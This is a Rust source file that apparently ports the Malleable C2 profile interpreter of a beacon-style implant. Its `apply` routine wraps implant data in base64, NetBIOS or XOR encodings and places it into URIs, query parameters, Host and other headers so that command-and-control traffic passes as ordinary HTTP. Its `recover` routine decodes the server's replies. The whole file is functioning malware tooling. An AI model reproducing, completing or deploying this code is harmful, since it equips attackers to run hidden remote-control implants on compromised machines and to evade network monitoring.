//! Malleable C2 profile program interpreter (profile.cpp).
//!
//! `apply` executes a transform program over a `profile` struct to build a
//! request (URI, parameters, headers, body). `recover` runs the inverse
//! program on received data.

use crate::encoders::{base64url_decode, base64url_encode, netbios_decode, netbios_encode, xor_decode, xor_encode};
use crate::parse::DataP;
use crate::settings::setting_ptr;
use crate::beacon::SETTING_HOST_HEADER;

pub const IN_APPEND: u32 = 0x01;
pub const IN_PREPEND: u32 = 0x02;
pub const IN_BASE64: u32 = 0x03;
pub const IN_PRINT: u32 = 0x04;
pub const IN_PARAMETER: u32 = 0x05;
pub const IN_HEADER: u32 = 0x06;
pub const IN_BUILD: u32 = 0x07;
pub const IN_NETBIOS: u32 = 0x08;
pub const IN_ADD_PARAMETER: u32 = 0x09;
pub const IN_ADD_HEADER: u32 = 0x0a;
pub const IN_NETBIOSU: u32 = 0x0b;
pub const IN_URI_APPEND: u32 = 0x0c;
pub const IN_BASE64URL: u32 = 0x0d;
pub const IN_MASK: u32 = 0x0f;
pub const IN_ADD_HEADER_HOST: u32 = 0x10;

const STATIC_ALLOC_SIZE: usize = 8192;

pub struct Profile {
    pub headers: Vec<u8>,
    pub parameters: Vec<u8>,
    pub uri: Vec<u8>,
    pub buffer: Vec<u8>,
    pub blen: usize,
    pub temp: Vec<u8>,
    pub stage: Vec<u8>,
    pub max: usize,
}

impl Profile {
    pub fn new(size: usize) -> Profile {
        let mut max = size * 3;
        if max < STATIC_ALLOC_SIZE {
            max = STATIC_ALLOC_SIZE;
        }
        Profile {
            headers: vec![0u8; 1024],
            parameters: vec![0u8; 1024],
            uri: vec![0u8; 1024],
            buffer: vec![0u8; max],
            blen: 0,
            temp: vec![0u8; max],
            stage: vec![0u8; max],
            max,
        }
    }
}

fn strip_nul(v: &[u8]) -> &[u8] {
    match v.iter().position(|&c| c == 0) {
        Some(i) => &v[..i],
        None => v,
    }
}

/// Read a NUL-terminated length+string (data_string semantics).
fn profile_string(parser: &mut DataP, arg: &mut [u8]) -> usize {
    parser.data_string(arg, arg.len())
}

fn base64_encode_tomcrypt(src: &[u8], dst: &mut [u8]) -> i32 {
    use base64::Engine;
    let engine = base64::engine::general_purpose::STANDARD;
    let enc = engine.encode(src);
    if enc.len() >= dst.len() {
        return -1;
    }
    dst[..enc.len()].copy_from_slice(enc.as_bytes());
    0
}

fn base64_decode_tomcrypt(src: &[u8], dst: &mut [u8]) -> i32 {
    use base64::Engine;
    let engine = base64::engine::general_purpose::STANDARD;
    match engine.decode(src) {
        Ok(d) if d.len() <= dst.len() => {
            dst[..d.len()].copy_from_slice(&d);
            0
        }
        _ => -1,
    }
}

/// Execute the transform program `program` against `myprofile`.
pub fn apply(program: &[u8], prof: &mut Profile, arg1: &[u8], len1: usize, arg2: &[u8], len2: usize) {
    let hosth = setting_ptr(SETTING_HOST_HEADER).map(|s| s.to_vec());
    let mut hostset = false;

    let mut prog_copy = program.to_vec();
    prog_copy.resize(1024, 0);
    let mut parser = DataP::init(&mut prog_copy[..]);

    let mut length: usize = 0;
    let mut arg = [0u8; 1024];

    loop {
        let next = parser.data_int();
        match next {
            IN_APPEND => {
                arg.fill(0);
                let sz = profile_string(&mut parser, &mut arg);
                let s = strip_nul(&arg[..sz]);
                prof.temp[length..length + s.len()].copy_from_slice(s);
                length += s.len();
            }
            IN_PREPEND => {
                arg.fill(0);
                let sz = profile_string(&mut parser, &mut arg);
                let s = strip_nul(&arg[..sz]);
                // concat arg + temp
                prof.stage[..s.len()].copy_from_slice(s);
                prof.stage[s.len()..s.len() + length].copy_from_slice(&prof.temp[..length]);
                length += s.len();
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_BASE64 => {
                let status = base64_encode_tomcrypt(&prof.temp[..length], &mut prof.stage);
                if status != 0 {
                    return;
                }
                length = strip_nul(&prof.stage[..]).len();
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_BASE64URL => {
                length = base64url_encode(&prof.temp[..length], &mut prof.stage);
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_PRINT => {
                prof.buffer[..length].copy_from_slice(&prof.temp[..length]);
                prof.blen = length;
            }
            IN_PARAMETER => {
                arg.fill(0);
                let _ = profile_string(&mut parser, &mut arg);
                let a = strip_nul(&arg[..]);
                if prof.parameters[0] == 0 {
                    let _ = write_str(&mut prof.stage, &format!("?{}={}", String::from_utf8_lossy(a), String::from_utf8_lossy(&prof.temp[..length])));
                } else {
                    let _ = write_str(&mut prof.stage, &format!("{}&{}={}", String::from_utf8_lossy(strip_nul(&prof.parameters[..])), String::from_utf8_lossy(a), String::from_utf8_lossy(&prof.temp[..length])));
                }
                prof.parameters[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            IN_HEADER => {
                arg.fill(0);
                let _ = profile_string(&mut parser, &mut arg);
                let a = strip_nul(&arg[..]);
                let _ = write_str(&mut prof.stage, &format!("{}{}: {}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(a), String::from_utf8_lossy(&prof.temp[..length])));
                prof.headers[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            IN_BUILD => {
                // extract the name of the argument we want to get
                let x = parser.data_int();
                if x == 0 {
                    prof.temp[..len1].copy_from_slice(&arg1[..len1]);
                    length = len1;
                } else if x == 1 {
                    prof.temp[..len2].copy_from_slice(&arg2[..len2]);
                    length = len2;
                }
            }
            IN_NETBIOS => {
                length = netbios_encode(b'a', &prof.temp[..length], &mut prof.stage, prof.max);
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_ADD_PARAMETER => {
                arg.fill(0);
                let _ = profile_string(&mut parser, &mut arg);
                let a = strip_nul(&arg[..]);
                if prof.parameters[0] == 0 {
                    let _ = write_str(&mut prof.stage, &format!("?{}", String::from_utf8_lossy(a)));
                } else {
                    let _ = write_str(&mut prof.stage, &format!("{}&{}", String::from_utf8_lossy(strip_nul(&prof.parameters[..])), String::from_utf8_lossy(a)));
                }
                prof.parameters[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            IN_ADD_HEADER => {
                arg.fill(0);
                let _ = profile_string(&mut parser, &mut arg);
                let a = strip_nul(&arg[..]);
                let _ = write_str(&mut prof.stage, &format!("{}{}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(a)));
                prof.headers[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            IN_ADD_HEADER_HOST => {
                arg.fill(0);
                let _ = profile_string(&mut parser, &mut arg);
                if let Some(hosth) = &hosth {
                    if !hosth.is_empty() {
                        let _ = write_str(&mut prof.stage, &format!("{}{}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(hosth)));
                        hostset = true;
                    } else {
                        let _ = write_str(&mut prof.stage, &format!("{}{}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(strip_nul(&arg[..]))));
                    }
                } else {
                    let _ = write_str(&mut prof.stage, &format!("{}{}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(strip_nul(&arg[..]))));
                }
                prof.headers[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            IN_NETBIOSU => {
                length = netbios_encode(b'A', &prof.temp[..length], &mut prof.stage, prof.max);
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_MASK => {
                length = xor_encode(&prof.temp[..length], &mut prof.stage, prof.max);
                prof.temp[..prof.max].fill(0);
                prof.temp[..length].copy_from_slice(&prof.stage[..length]);
            }
            IN_URI_APPEND => {
                let _ = write_str(&mut prof.stage, &format!("{}{}", String::from_utf8_lossy(strip_nul(&prof.uri[..])), String::from_utf8_lossy(&prof.temp[..length])));
                prof.uri[..1024].copy_from_slice(&prof.stage[..1024]);
            }
            0x0 => {
                // set our HTTP Host header if needed
                if !hostset {
                    if let Some(hosth) = &hosth {
                        if !hosth.is_empty() {
                            let _ = write_str(&mut prof.stage, &format!("{}{}\r\n", String::from_utf8_lossy(strip_nul(&prof.headers[..])), String::from_utf8_lossy(hosth)));
                            prof.headers[..1024].copy_from_slice(&prof.stage[..1024]);
                        }
                    }
                }
                return;
            }
            _ => return,
        }
    }
}

fn write_str(dst: &mut [u8], s: &str) -> Result<(), std::fmt::Error> {
    let bytes = s.as_bytes();
    if bytes.len() > dst.len() {
        return Err(std::fmt::Error);
    }
    dst[..bytes.len()].copy_from_slice(bytes);
    Ok(())
}

/// Run the recover program on received data (in place in `buffer`).
/// Returns the recovered length, or 0 on failure.
pub fn recover(program: &[u8], buffer: &mut [u8], read: usize, max: usize) -> usize {
    let mut temp = vec![0u8; read.max(1)];

    let mut prog_copy = program.to_vec();
    prog_copy.resize(1024, 0);
    let mut parser = DataP::init(&mut prog_copy[..]);

    let mut read = read;
    let mut tlen = max;

    loop {
        let next = parser.data_int();
        match next {
            IN_APPEND => {
                // strip right [sz] characters from buffer
                let sz = parser.data_int() as usize;
                if read < sz {
                    return 0;
                }
                read -= sz;
            }
            IN_PREPEND => {
                // strip left [sz] characters
                let sz = parser.data_int() as usize;
                if sz > read {
                    return 0;
                }
                temp[..read].copy_from_slice(&buffer[..read]);
                buffer[..read - sz].copy_from_slice(&temp[sz..read]);
                read -= sz;
            }
            IN_BASE64 => {
                tlen = max;
                let status = base64_decode_tomcrypt(&buffer[..read], &mut temp);
                if status != 0 {
                    return 0;
                }
                read = tlen.min(temp.len());
                read = strip_nul(&temp[..]).len().min(max);
                buffer[..read].copy_from_slice(&temp[..read]);
            }
            IN_BASE64URL => {
                tlen = max;
                let n = base64url_decode(&buffer[..read], max, &mut temp);
                if n == 0 {
                    return 0;
                }
                read = n.min(max);
                buffer[..read].copy_from_slice(&temp[..read]);
            }
            IN_PRINT | IN_PARAMETER | IN_HEADER | IN_URI_APPEND => {}
            IN_NETBIOS => {
                tlen = max;
                read = netbios_decode(b'a', &buffer[..read], &mut temp, tlen);
                if read == 0 {
                    return 0;
                }
                buffer[..read].copy_from_slice(&temp[..read]);
            }
            IN_NETBIOSU => {
                tlen = max;
                read = netbios_decode(b'A', &buffer[..read], &mut temp, tlen);
                if read == 0 {
                    return 0;
                }
                buffer[..read].copy_from_slice(&temp[..read]);
            }
            IN_MASK => {
                tlen = max;
                read = xor_decode(&buffer[..read], &mut temp, tlen);
                if read == 0 {
                    return 0;
                }
                buffer[..read].copy_from_slice(&temp[..read]);
            }
            0x0 => return read,
            _ => return 0,
        }
    }
}

pub fn profile_setup(prof: &mut Profile, size: usize) {
    *prof = Profile::new(size);
}

pub fn profile_free(_prof: &mut Profile) {}
